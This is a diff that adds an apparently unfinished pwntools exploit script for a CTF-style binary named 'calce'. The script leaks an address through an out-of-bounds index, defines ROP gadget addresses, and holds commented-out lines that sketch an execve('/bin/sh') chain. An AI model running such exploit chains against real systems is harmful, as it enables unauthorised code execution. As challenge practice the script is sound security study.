@@ -1,0 +1,69 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+
+exe = ELF("./calce")
+# context.log_level='debug'
+context.terminal = ["foot"]
+# p = remote("addr", 1337)
+p = process([exe.path])
+def gdbs():
+    gdb.attach(p, gdbscript="""
+    # cmp >9
+    # b*0x08049098
+    # b*0x08049354
+    # b*0x080491C7
+    # if null or not ?
+    # b*0x8049164
+    # b*0x080491B7
+    # b*0x08049247
+    # b*0x08049303
+    b*0x080493FF
+
+
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #                 """)
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+gdbs()
+pop_eax = 0x0805c34b
+int_80 = 0x08049a21
+pop_ecx_ebx = 0x080701d1
+pop_edx = 0x080701aa
+idx = 360
+sl(f"+{idx}")
+addr = int(p.recvline())
+# addr = int(p.recvuntil("/n",drop=True))
+log.info(f"{hex(addr)}")
+# input()
+# sl(f"")
+# sl(str(pop_eax))
+# sl(str(0xb))
+# sl(str(pop_ecx_ebx))
+# sl(str(0))
+# sl(str())
+# sl(f"+{idx}+{pop_eax}")
+# sl(f"+{idx+1}+{pop_ecx_ebx&0xffffffff}")
+# sl(f"+{idx+2}")
+# sl(f"+{idx+3}+{exe.search("/bin/sh").__next__()}")
+# sl(f"+{idx+3}+{pop_edx}")
+# sl(f"+{idx+4}")
+# sl(f"+{idx+5}")
+
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
